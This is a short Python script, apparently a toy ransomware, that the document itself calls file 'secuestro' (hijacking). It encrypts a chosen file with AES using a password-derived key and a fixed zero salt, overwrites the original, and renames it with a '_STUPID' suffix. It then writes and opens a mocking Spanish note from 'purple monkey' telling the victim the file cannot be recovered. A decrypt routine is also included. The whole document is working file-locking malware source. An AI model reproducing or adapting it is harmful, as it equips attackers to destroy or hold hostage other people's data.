import os
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import padding
from datetime import datetime

def generar_clave(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

def crear_archivo_info(ruta_archivo, nuevo_nombre):
    nombre_archivo_info = f"{nuevo_nombre}_info.txt"
    
    if os.path.exists(nombre_archivo_info):
        print(f"El archivo de información {nombre_archivo_info} ya existe.")
        return

    tamano_archivo = os.path.getsize(nuevo_nombre)
    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    info = (
        f"¡Hola!, te estaras preguntado por que te aparecio esto, pues te digo que tu archivo fue secuestrado por purple monkey jaja, solo te digo q no lo puedes recuperar, eres una victima y otro tonto mas de purple monkey, somos los mejores jaja, bye bye tonto!,\n"
        f"Obsera tu archivo jaja\n"
        f"Archivo Secuestrado: {nuevo_nombre}\n"
        f"Nombre original: {os.path.basename(ruta_archivo)}\n"
        f"Tamaño: {tamano_archivo} bytes\n"
        f"Fecha de Secuestro: {fecha}\n"
    )
    
    with open(nombre_archivo_info, 'w') as f:
        f.write(info)
    
    print(f"Archivo de información creado: {nombre_archivo_info}")
    
    os.startfile(nombre_archivo_info) if os.name == 'nt' else os.system(f"open {nombre_archivo_info}")

def cifrar_archivo(ruta_archivo, clave):
    try:
        with open(ruta_archivo, 'rb') as f:
            datos = f.read()

        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        datos_padded = padder.update(datos) + padder.finalize()

        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(clave), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        datos_cifrados = encryptor.update(datos_padded) + encryptor.finalize()

        with open(ruta_archivo, 'wb') as f:
            f.write(iv + datos_cifrados)

        nombre_archivo, extension = os.path.splitext(ruta_archivo)
        nuevo_nombre = f"{nombre_archivo}_STUPID{extension}"
        os.rename(ruta_archivo, nuevo_nombre)

        print(f"Archivo cifrado y protegido: {nuevo_nombre}")
        
        crear_archivo_info(ruta_archivo, nuevo_nombre)

    except Exception as e:
        print(f"Error al cifrar {ruta_archivo}: {e}")

def descifrar_archivo(ruta_archivo, clave):
    try:
        with open(ruta_archivo, 'rb') as f:
            iv = f.read(16)
            datos_cifrados = f.read()

        cipher = Cipher(algorithms.AES(clave), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        datos_descifrados = decryptor.update(datos_cifrados) + decryptor.finalize()

        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        datos = unpadder.update(datos_descifrados) + unpadder.finalize()

        nombre_archivo, extension = os.path.splitext(ruta_archivo)
        nuevo_nombre = nombre_archivo.replace("_STUPID", "") + extension
        with open(nuevo_nombre, 'wb') as f:
            f.write(datos)

        os.remove(ruta_archivo)
        print(f"Archivo descifrado: {nuevo_nombre}")

        os.startfile(nuevo_nombre) if os.name == 'nt' else os.system(f"open {nuevo_nombre}")

    except ValueError:
        print("Error: La contraseña proporcionada es incorrecta o el archivo está dañado.")
    except Exception as e:
        print(f"Error al descifrar {ruta_archivo}: {e}")

def mostrar_mensaje():
    os.system("cls" if os.name == "nt" else "clear")
    print("=== ¡Tenemos archivos? jaja! ===")
    print("Este archivo está secuestrado con contraseña.")
    print("Introduce la contraseña para continuar.")
    print("=" * 30)
    time.sleep(1)

def main():
    print("=== Secuestro de Archivos ===")
    ruta_archivo = input("Introduce la ruta del archivo que deseas secuestrar: ")

    mostrar_mensaje()
    
    password = input("Introduce la contraseña: ")
    salt = b'\x00' * 16
    clave = generar_clave(password, salt)

    accion = input("¿Deseas cifrar o descifrar el archivo? (cifrar/descifrar): ").strip().lower()

    if accion == "cifrar":
        cifrar_archivo(ruta_archivo, clave)
    elif accion == "descifrar":
        descifrar_archivo(ruta_archivo, clave)
    else:
        print("Acción no reconocida. Por favor, elige 'cifrar' o 'descifrar'.")

if __name__ == "__main__":
    main()
